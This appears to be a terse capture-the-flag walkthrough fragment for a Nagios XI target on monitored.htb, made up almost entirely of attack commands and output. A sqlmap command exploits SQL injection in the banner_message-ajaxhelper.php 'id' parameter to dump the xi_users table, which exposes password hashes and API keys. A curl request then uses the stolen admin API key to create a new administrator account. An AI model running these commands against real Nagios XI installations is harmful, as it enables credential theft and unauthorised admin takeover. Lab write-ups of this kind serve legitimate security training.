```bash
sqlmap --cookie="nagiosxi=3vk6s70i3j5upueug1hki81a0a" --url="https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper  
.php" --data="action=acknowledge_banner_message&id=3" -p id -D nagiosxi -T xi_users --dump

column -s, -t < xi_users.csv | less -#2 -N -S

user_id  email                name                  api_key                                                           enabled  passwor  
d                                                      username     created_by  last_login  api_enabled  last_edited  created_time  la  
st_attempt  backend_ticket                                                    last_edited_by  login_attempts  last_password_change  
1        admin@monitored.htb  Nagios Administrator  IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL  1        $2a$10$  
825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C  nagiosadmin  0           1701931372  1            1701427555   0             0  
           IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                  5               0               1701427555  
2        svc@monitored.htb    svc                   2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK  0        $2a$10$  
12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK  svc          1           1699724476  1            1699728200   1699634403    16  
99730174    6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq  1               3               1699697433
```

```
nagiosadmin password hash: $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C
nagiosadmin apikey: IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```

```bash
curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d 'username=kali&password=test&name=kali&email=kali@localhost&auth_level=admin'
```